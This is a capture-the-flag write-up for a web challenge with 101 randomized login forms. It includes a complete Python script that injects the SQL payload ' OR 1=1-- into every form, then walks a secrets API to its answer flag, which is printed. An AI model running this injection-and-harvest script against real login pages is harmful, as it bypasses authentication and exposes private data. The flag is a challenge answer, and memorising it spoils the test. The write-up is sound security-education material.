**Author: Zukane**

*There are a lot of login forms on this page, but unfortunately one of them is apparently vulnerable. Luckily, the rest of the forms are fine so in general we should be safe. However, to avoid hackers, we had to set the session validity to 60 seconds to ensure hackers have no time to explore the protected areas of the web app. The login endpoints are refreshed every 30 seconds to avoid hackers going straight back in.*

##### Challenge overview

In this web challenge, we are not given any source code, but we are given a URL to connect to. On the site, we are met with 101 login forms. The challenge description states that only one of them is vulnerable. We can try performing SQL injection on random forms, but since we also are short on time, we have to do it programmatically. 

Using inspect element (my most powerful tool), we can see that the forms are randomized login endpoints, like: `/login/kwSvBCRbem`
These are randomized on refresh.

However, we can use `BeautifulSoup` to collect all the forms and try logging in with an SQL injection. I used the SQL injection `' OR 1=1--`, figuring that any simple one would suffice. You can see the implementation in the solve script below.

After a successful login, we are met with a welcome page:

```html
<!doctype html>
<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">

  <title>Home</title>
</head>
<body>
  <div class="container mt-5">
    
<div class="container mt-5">
    <h1 class="text-center mb-4">Welcome to Our App!</h1>
    <div class="row">
        <div class="col-md-8 offset-md-2">
            <div class="card">
                <div class="card-header bg-primary text-white">
                    <h5>Get Started</h5>
                </div>
                <div class="card-body">
                    <p class="card-text">
                        This web application is designed to help you manage and retrieve information seamlessly.
                        We are currently building out features, but check out the <a href="/api-docs" style="text-decoration: none; color: inherit;">API documentation</a> if you can't wait. 
                    </p>
                    <hr>
                    <h6>Features:</h6>
                    <ul>
                        <li>User-friendly interface</li>
                        <li>Fast and reliable performance</li>
                        <li>Seamless navigation</li>
                    </ul>
                    <!-- TODO: Add link to API docs-->

                    <!-- Logout Button -->
                    <form action="/logout" method="get">
                      <input type="submit" class="btn btn-danger" value="Logout">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

  </div>
  
  <!-- Bootstrap Bundle with Popper -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
</body>
</html>
```

The welcome page alludes to an API, and the documentation at `/api-docs`. We can't simply navigate to it, as we need our cookie. I decide to access this page programmatically as well. Here is the cleaned up API documentation for GET:

```
GET /api/secrets
Retrieves a paginated list of text secrets.

Parameters:
  - page (optional): The page number to retrieve (default is 1).
  - page_size (optional): The number of secrets per page. Can be 5, 10, or 20 (default is 5).

Returns: A JSON object with the following fields:
  - page: The current page number.
  - page_size: The number of secrets per page.
  - total_pages: The total number of pages available.
  - secrets: A JSON array of message objects for the current page.

Example request:
curl -X GET "http://example.com/api/secrets?page=2&page_size=10"

Example response:
{
  "page": 2,
  "page_size": 10,
  "total_pages": 5,
  "secrets": [
    {
      "id": 11,
      "text": "Message on page 2"
    },
    {
      "id": 12,
      "text": "Another message on page 2"
    }
  ]
}
```

Essentially, we can access a bunch of secret pages with different page sizes (max 20). The flag is probably one of these pages.
However, we are short on time, especially after brute-forcing the login. Luckily, the pages are static, so we can run the solve script multiple times and just change which page we start from.

##### Solve script

very big kudos to Dr. ChatGPT for cooking this solve script

```python
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urljoin

BASE_URL = 'https://munintrollet-6138-allthoseforms.ept.gg'

async def test_form(session, form):
    action = form.get('action')
    if not action:
        return False
    action_url = urljoin(BASE_URL, action)

    # Collect all input fields, including hidden fields (e.g., CSRF tokens)
    inputs = form.find_all('input')
    data = {}
    for input_field in inputs:
        name = input_field.get('name')
        if not name:
            continue
        input_type = input_field.get('type', 'text')
        if input_type == 'text':
            data[name] = "' OR 1=1--"  # SQL injection payload
        elif input_type == 'password':
            data[name] = 'password'
        else:
            # Include hidden fields like CSRF tokens
            data[name] = input_field.get('value', '')

    try:
        # Send the login request
        async with session.post(action_url, data=data) as response:
            text = await response.text()
            # Check for success indicators
            if 'Welcome to Our App!' in text:
                print(f'[+] Vulnerable form found: {action_url}')
                print('[+] Logged in successfully.')

                print(text)

                # Print cookies after login
                print('[+] Cookies after login:')
                for cookie in session.cookie_jar:
                    print(cookie)

                # Access the protected endpoints after successful login
                await access_protected_area(session)
                await access_api_docs(session)  # Access the /api-docs endpoint
                return True
            else:
                print(f'[-] Login failed for form: {action_url}')
    except Exception as e:
        print(f'[-] Error with {action_url}: {e}')
    return False

async def access_protected_area(session):
    # Access the /api/secrets endpoint
    secrets_url = urljoin(BASE_URL, '/api/secrets')
    print(f'[+] Attempting to access {secrets_url}')
    # Initialize pagination variables
    page = 79
    page_size = 20  # Adjust if needed
    flag_found = False

    while not flag_found:
        params = {'page': page, 'page_size': page_size}
        print(f"ACCESSING PAGE: {page}")
        async with session.get(secrets_url, params=params) as response:
            if response.status != 200:
                print(f'[-] Failed to access /api/secrets, status code: {response.status}')
                break

            data = await response.json()
            secrets = data.get('secrets', [])

            if not secrets:
                print('[-] No secrets found on this page.')
                break

            for secret in secrets:
                secret_text = secret.get('text', '')
                print(f"[+] Secret found: {secret_text}")
                if 'EPT{' in secret_text:
                    print('[+] Flag found:')
                    print(secret_text)
                    flag_found = True
                    break

            # Check if we've reached the last page
            total_pages = data.get('total_pages', 0)
            if page >= total_pages:
                print('[-] Reached the last page without finding the flag.')
                break
            page += 1  # Move to the next page

    if not flag_found:
        print('[-] Flag not found in any secrets.')

async def access_api_docs(session):
    # Attempt to access the /api-docs endpoint
    api_docs_url = urljoin(BASE_URL, '/api-docs')
    print(f'[+] Attempting to access {api_docs_url}')

    async with session.get(api_docs_url) as response:
        if response.status == 200:
            print('[+] Successfully accessed /api-docs')
            docs_text = await response.text()
            print(docs_text)  # Print the documentation or save it for analysis
        else:
            print(f'[-] Failed to access /api-docs, status code: {response.status}')

async def main():
    connector = aiohttp.TCPConnector(limit_per_host=100)
    timeout = aiohttp.ClientTimeout(total=20)

    # Set headers to mimic a real browser
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': BASE_URL,
    }

    async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
        # Fetch the main page
        async with session.get(BASE_URL) as response:
            text = await response.text()

        soup = BeautifulSoup(text, 'html.parser')

        # Find all forms
        forms = soup.find_all('form')

        for form in forms:
            success = await test_form(session, form)
            if success:
                print('[+] Exiting form loop after successful login.')
                break  # Exit the loop after successful login

if __name__ == '__main__':
    asyncio.run(main())
```

Running this script a couple of times lets us find the flag on page 78 (with pagesize 20):

```
[...]
ACCESSING PAGE: 78
[+] Secret found: Individual ready particular time line main pick reflect.
[+] Secret found: Add choice tell begin.
[+] Secret found: Police better office where another member.
[+] Secret found: Marriage less record short.
[+] Secret found: Country usually another how stock himself a seat.
[+] Secret found: Big each other own true college class.
[+] Secret found: Point wall government they eye.
[+] Secret found: Beautiful Mr state else eat green.
[+] Secret found: Ability collection great a along all factor.
[+] Secret found: Season Republican process hundred.
[+] Secret found: Seem she have card page.
[+] Secret found: Kitchen on happen beyond who.
[+] Secret found: Tough his middle family health role century.
[+] Secret found: EPT{0ae0fbea-9a8c-4b2c-8e33-b383c8c8f94f}
[+] Flag found:
EPT{0ae0fbea-9a8c-4b2c-8e33-b383c8c8f94f}
```

`EPT{0ae0fbea-9a8c-4b2c-8e33-b383c8c8f94f}`

